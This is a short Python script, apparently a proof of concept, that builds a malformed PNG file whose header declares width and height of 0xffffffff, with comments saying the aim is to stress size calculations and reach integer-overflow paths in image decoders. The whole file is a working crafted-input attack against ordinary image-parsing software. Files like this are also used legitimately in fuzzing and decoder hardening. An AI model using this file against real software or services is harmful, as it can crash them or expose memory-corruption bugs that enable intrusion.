import struct, zlib, pathlib

def chunk(t, d):
    return struct.pack('>I', len(d)) + t + d + struct.pack('>I', zlib.crc32(t+d)&0xffffffff)

sig=b'\x89PNG\r\n\x1a\n'
# huge dimensions to stress size calc and maybe overflow paths
ihdr=chunk(b'IHDR', struct.pack('>IIBBBBB',0xffffffff,0xffffffff,8,6,0,0,0))
# no IDAT needed if size calc happens first
poc=sig+ihdr+chunk(b'IEND', b'')
pathlib.Path('huge_dims.png').write_bytes(poc)
print(len(poc))
